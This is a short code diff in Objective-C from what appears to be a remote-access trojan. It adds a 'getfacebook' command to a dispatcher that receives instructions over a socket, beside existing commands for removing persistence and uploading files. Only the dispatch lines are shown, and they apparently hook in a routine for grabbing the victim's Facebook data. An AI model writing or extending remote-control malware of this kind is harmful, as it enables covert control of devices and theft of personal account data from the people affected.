@@ -107,6 +107,9 @@ int main(int argc, const char * argv[]) {
                 else if ([cmdarray[0] isEqualToString: @"rmpersistence"]) {
                     [_espl removePersistence:socketInfo[0]:socketInfo[1]];
                 }
+                else if ([cmdarray[0] isEqualToString: @"getfacebook"]) {
+                    [_espl getFacebook];
+                }
                 else if ([cmdarray[0] isEqualToString: @"upload"]) { //still need to do this
                     [_espl receiveFile:cmdarray[0]];
                 }
